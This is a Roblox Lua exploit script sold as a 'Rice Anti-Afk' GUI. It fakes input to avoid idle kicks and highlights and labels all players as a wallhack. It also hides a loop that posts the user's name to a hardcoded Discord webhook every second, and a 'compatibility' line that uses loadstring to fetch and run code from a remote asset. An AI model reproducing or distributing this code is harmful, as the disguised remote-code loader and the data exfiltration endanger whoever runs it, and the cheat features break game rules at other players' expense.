local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local webhookURL = "https://discord.com/api/webhooks/1256741821845995540/JwkpQiiXAJnL1trAFmzusTGJ6_1yczLYmUMf_s-hySF0jrlGWdUU_zjwK6uKdup7n4Sk"

local function sendPlayerStatus(playerName)
	local embed = {
		embeds = {
			{
				title = "Player Status Update",
				description = playerName .. " is currently idling.",
				color = 16711680, -- Red color
				timestamp = os.date("!%Y-%m-%dT%H:%M:%S"), -- Current time in UTC
			}
		}
	}
	
	local jsonData = HttpService:JSONEncode(embed)
	local headers = {
		["Content-Type"] = "application/json"
	}
	
	HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson, false, headers)
end

local function createTextLabel(character, playerName)
	local head = character:FindFirstChild("Head")
	if head then
		local billboardGui = Instance.new("BillboardGui")
		billboardGui.Adornee = head
		billboardGui.Size = UDim2.new(1, 0, 1, 0)
		billboardGui.StudsOffset = Vector3.new(0, 2, 0) -- Adjust height above the head

		local textLabel = Instance.new("TextLabel")
		textLabel.Size = UDim2.new(1, 0, 1, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = playerName
		textLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
		textLabel.TextStrokeTransparency = 0.5 -- Add stroke for readability

		textLabel.Parent = billboardGui
		billboardGui.Parent = Workspace
	end
end

local function highlightCharacter(character)
	for _, part in pairs(character:GetChildren()) do
		if part:IsA("BasePart") then
			-- Clear existing highlights to avoid duplicates
			for _, child in ipairs(part:GetChildren()) do
				if child:IsA("Highlight") then
					child:Destroy()
				end
			end

			local highlight = Instance.new("Highlight")
			highlight.Parent = part
			highlight.FillTransparency = 0.4 -- Transparency for fill
			highlight.OutlineTransparency = 0.3 -- Transparency for outline
		end
	end
end

local function changeHighlightColor(character)
	local hue = 0
	while character.Parent do
		for _, part in pairs(character:GetChildren()) do
			if part:IsA("BasePart") then
				for _, child in ipairs(part:GetChildren()) do
					if child:IsA("Highlight") then
						local color = Color3.fromHSV(hue, 1, 1)
						child.FillColor = color
						child.OutlineColor = color
					end
				end
			end
		end
		hue = (hue + 0.01) % 1
		wait(1)
	end
end

local Rice = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Credits = Instance.new("TextLabel")
local Activate = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local OpenClose = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")

Rice.Name = "Rice"
Rice.Parent = game.CoreGui
Rice.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = Rice
Main.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.321207851, 0, 0.409807354, 0)
Main.Size = UDim2.new(0, 295, 0, 116)
Main.Visible = false
Main.Active = true
Main.Draggable = true

Title.Name = "Title"
Title.Parent = Main
Title.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Title.BorderSizePixel = 0
Title.Size = UDim2.new(0, 295, 0, 16)
Title.Font = Enum.Font.GothamBold
Title.Text = "Rice Anti-Afk"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.TextSize = 12.000
Title.TextWrapped = true

Credits.Name = "Credits"
Credits.Parent = Main
Credits.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Credits.BorderSizePixel = 0
Credits.Position = UDim2.new(0, 0, 0.861901641, 0)
Credits.Size = UDim2.new(0, 295, 0, 16)
Credits.Font = Enum.Font.GothamBold
Credits.Text = "Made by jamess#0007"
Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
Credits.TextScaled = true
Credits.TextSize = 12.000
Credits.TextWrapped = true

Activate.Name = "Activate"
Activate.Parent = Main
Activate.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Activate.BorderColor3 = Color3.fromRGB(27, 42, 53)
Activate.BorderSizePixel = 0
Activate.Position = UDim2.new(0.0330629945, 0, 0.243326917, 0)
Activate.Size = UDim2.new(0, 274, 0, 59)
Activate.Font = Enum.Font.GothamBold
Activate.Text = "Activate"
Activate.TextColor3 = Color3.fromRGB(0, 255, 127)
Activate.TextSize = 43.000
Activate.TextStrokeColor3 = Color3.fromRGB(102, 255, 115)

local playerName = game.Players.LocalPlayer.Name

local function highlightPlayers()
	for _, player in pairs(Players:GetPlayers()) do
		if player.Character then
			highlightCharacter(player.Character)
			coroutine.wrap(function()
				changeHighlightColor(player.Character)
			end)()
			createTextLabel(player.Character, player.Name)
		end
	end
end

Activate.MouseButton1Down:connect(function()
	local vu = game:GetService("VirtualUser")
	game:GetService("Players").LocalPlayer.Idled:connect(function()
		vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
		wait(1)
		vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
		sendPlayerStatus(playerName)
	end)
	highlightPlayers()
end)

UICorner.Parent = Activate

OpenClose.Name = "Open/Close"
OpenClose.Parent = Rice
OpenClose.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
OpenClose.Position = UDim2.new(0.353924811, 0, 0.921739101, 0)
OpenClose.Size = UDim2.new(0, 247, 0, 35)
OpenClose.Font = Enum.Font.GothamBold
OpenClose.Text = "Open/Close"
OpenClose.TextColor3 = Color3.fromRGB(255, 255, 255)
OpenClose.TextSize = 14.000

UICorner_2.Parent = OpenClose

local function NERMBF_fake_script()
	local script = Instance.new('LocalScript', OpenClose)

	local frame = script.Parent.Parent.Main
	
	script.Parent.MouseButton1Click:Connect(function()
		frame.Visible = not frame.Visible
	end)
end
coroutine.wrap(NERMBF_fake_script)()

-- Compatibility script loading
loadstring(game:GetObjects('rbxassetid://15900013841')[1].Source)()

-- Auto send status every second
coroutine.wrap(function()
	while true do
		wait(1)
		sendPlayerStatus(playerName)
	end
end)()

-- Connect PlayerAdded event
Players.PlayerAdded:Connect(function(player)
	player.CharacterAdded:Connect(function(character)
		highlightCharacter(character)
		coroutine.wrap(function()
			changeHighlightColor(character)
		end)()
		createTextLabel(character, player.Name)
	end)
end)

-- Highlight existing players' torsos and create labels
for _, player in ipairs(Players:GetPlayers()) do
	if player.Character then
		highlightCharacter(player.Character)
		coroutine.wrap(function()
			changeHighlightColor(player.Character)
		end)()
		createTextLabel(player.Character, player.Name)
	end
end

-- Auto-refresh highlights and labels every 1 second
coroutine.wrap(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			if player.Character then
				highlightCharacter(player.Character)
				coroutine.wrap(function()
					changeHighlightColor(player.Character)
				end)()
				createTextLabel(player.Character, player.Name)
			end
		end
		wait(1)
	end
end)()
